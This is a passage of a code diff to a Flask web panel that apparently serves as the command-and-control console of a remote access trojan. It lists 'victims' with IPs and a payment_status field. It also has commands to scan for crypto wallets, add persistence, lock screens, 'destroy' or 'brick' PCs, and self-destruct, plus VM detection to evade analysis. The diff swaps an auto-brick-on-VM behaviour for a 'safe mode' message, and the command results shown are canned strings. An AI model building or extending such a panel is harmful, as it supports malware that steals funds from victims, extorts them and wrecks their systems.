+                    addMessage('notification', command + ' executed on ' + state.selectedVictim, 'notification');
+                    
                     const outputEl = document.getElementById('commandOutput');
-                    outputEl.innerHTML = '<div class="output-item"><span class="type command">CMD</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + data.result + '</div>' + outputEl.innerHTML;
+                    outputEl.innerHTML = '<div class="output-item"><span class="type success">success</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + data.result + '</div>' + outputEl.innerHTML;
+                    
                     if (command === 'scan' && data.wallets) {
                         data.wallets.forEach(w => {
-                            addMessage('WALLET', w.currency + ': ' + w.balance + ' ($' + w.usd + ')', 'wallet');
+                            addMessage('wallet', w.currency + ': ' + w.balance + ' ($' + w.usd + ')', 'wallet');
                         });
+                        state.notifications++;
                     }
+                    
                     if (command === 'vmcheck' && data.is_vm) {
-                        addMessage('VM', '⚠ VM DETECTED! Confidence: ' + data.confidence + '%', 'vm');
-                        addMessage('System', '🔴 AUTO-BRICK INITIATED!', 'system');
+                        addMessage('system', 'VM detected on ' + state.selectedVictim + ' (confidence: ' + data.confidence + '%) - safe mode: no action taken', 'system');
+                        addMessage('notification', 'VM detected on ' + state.selectedVictim + ' - safe mode', 'notification');
                     }
+                    
                     showVictimDetails(state.selectedVictim);
                     updateStats();
                 } else {
-                    addMessage('System', 'Command failed: ' + (data.error || 'Unknown'), 'system');
+                    state.notifications++;
+                    addMessage('bot', 'failed: ' + command, 'bot');
+                    addMessage('notification', command + ' failed on ' + state.selectedVictim, 'notification');
+                    const outputEl = document.getElementById('commandOutput');
+                    outputEl.innerHTML = '<div class="output-item"><span class="type failed">failed</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + (data.error || 'unknown error') + '</div>' + outputEl.innerHTML;
+                    updateStats();
                 }
             });
         }
@@ -718,14 +858,18 @@ HTML = """
             const msg = input.value.trim();
             if (!msg) return;
             input.value = '';
+            
             if (msg.startsWith('/')) {
                 sendCommand(msg.substring(1).toLowerCase());
             } else {
                 if (!state.selectedVictim) {
-                    addMessage('System', 'Select a victim!', 'system');
+                    addMessage('system', 'select a victim first', 'system');
                     return;
                 }
-                addMessage('VIRTUALS', msg, 'hacker');
+                addMessage('bot', 'sending: ' + msg, 'bot');
+                addMessage('victim', msg, 'victim');
+                state.notifications++;
+                updateStats();
             }
         }
         
@@ -733,11 +877,11 @@ HTML = """
             const container = document.getElementById('chatMessages');
             const time = new Date().toLocaleTimeString();
             let senderClass = 'system';
-            if (type === 'hacker') senderClass = 'hacker';
+            if (type === 'bot') senderClass = 'bot';
             else if (type === 'victim') senderClass = 'victim';
-            else if (type === 'output') senderClass = 'output';
+            else if (type === 'notification') senderClass = 'notification';
             else if (type === 'wallet') senderClass = 'wallet';
-            else if (type === 'vm') senderClass = 'vm';
+            
             container.innerHTML += '<div class="msg"><span class="time">[' + time + ']</span><span class="sender ' + senderClass + '">' + sender + '</span> ' + message + '</div>';
             container.scrollTop = container.scrollHeight;
         }
@@ -745,14 +889,14 @@ HTML = """
         function addDemoVictims() {
             if (Object.keys(state.victims).length === 0) {
                 const fake = [
-                    { id: 'SNIN-1001', pc: 'DESKTOP-ABC', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0 },
-                    { id: 'SNIN-1002', pc: 'LAPTOP-XYZ', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0 },
-                    { id: 'SNIN-1003', pc: 'VM-TEST', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation' }
+                    { id: 'SNIN-1001', pc: 'DESKTOP-ABC', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0, payment_status: 'pending' },
+                    { id: 'SNIN-1002', pc: 'LAPTOP-XYZ', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0, payment_status: 'paid' },
+                    { id: 'SNIN-1003', pc: 'VM-TEST', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation', payment_status: 'pending' }
                 ];
                 fake.forEach(v => { state.victims[v.id] = v; });
                 renderVictims();
                 updateStats();
-                addMessage('System', 'Demo victims loaded - VM Detection Active', 'system');
+                addMessage('system', 'demo victims loaded - safe mode active', 'system');
                 selectVictim(fake[0].id);
             }
         }
@@ -786,7 +930,7 @@ def api():
             victims[row[0]] = {
                 'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                 'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
-                'first_seen': row[7], 'last_seen': row[8]
+                'first_seen': row[7], 'last_seen': row[8], 'payment_status': row[9] if len(row) > 9 else 'pending'
             }
         conn.close()
         return jsonify({'success': True, 'victims': victims})
@@ -797,38 +941,37 @@ def api():
         
         results = {
             'whois': 'PC: DESKTOP-ABC | IP: 192.168.1.10 | OS: Windows 10 Pro | Status: Online',
-            'flash': '💥 Screen flashed 5 times successfully!',
-            'screenshot': '📸 Screenshot saved to screenshots/',
-            'scan': '🔍 Found: 3 BTC, 2 ETH, 1 LTC wallets',
-            'persist': '🔒 Persistence added to 8 locations!',
-            'lockdown': '🔐 Screen locked! PC is now inaccessible!',
-            'destroy': '💀 PC DESTROYED! CPU fried! System corrupted!',
-            'brick': '🧱 PC BRICKED! Motherboard firmware corrupted! CMOS wiped! BIOS corrupted! PC is now a paperweight!',
-            'oblivion': '🔮 OBLIVION ACTIVATED! RAT self-destructed! All traces wiped!',
-            'vmcheck': '⚠ VM DETECTED! Auto-brick initiated!'
+            'flash': 'Screen flashed 5 times',
+            'screenshot': 'Screenshot saved to screenshots/',
+            'scan': 'Found: 3 BTC, 2 ETH, 1 LTC wallets',
+            'persist': 'Persistence added to 8 locations',
+            'lockdown': 'Screen locked - system inaccessible',
+            'destroy': 'System corrupted - files encrypted',
+            'brick': 'PC BRICKED - permanent damage',
+            'oblivion': 'RAT self-destructed - traces wiped',
+            'vmcheck': 'VM detection complete - safe mode (no action taken)'
         }
         
         result = results.get(command, f"Command '{command}' executed")
         
-        # Check for VM on vmcheck command
+        # VM CHECK - SAFE MODE (NO AUTO-BRICK)
         is_vm = False
         confidence = 0
         if command == 'vmcheck':
             vm_result = VMDetector.check_all()
             is_vm = vm_result['is_vm']
             confidence = vm_result['confidence']
-            if is_vm:
-                result = f"⚠ VM DETECTED! Confidence: {confidence}% - AUTO-BRICK INITIATED!"
+            result = f"VM detected: {is_vm} | Confidence: {confidence}% | Safe mode: NO action taken"
         
         conn = get_db()
         c = conn.cursor()
         c.execute("INSERT INTO commands (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
                  (victim_id, command, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
         
-        # Update victim VM status
+        # Update victim VM status (information only - no auto-brick)
         if command == 'vmcheck':
             c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
-                     (1 if is_vm else 0, f"Confidence: {confidence}%" if is_vm else "Clean", victim_id))
+                     (1 if is_vm else 0, f"Confidence: {confidence}% (safe mode)" if is_vm else "Clean (safe mode)", victim_id))
         
         conn.commit()
         conn.close()
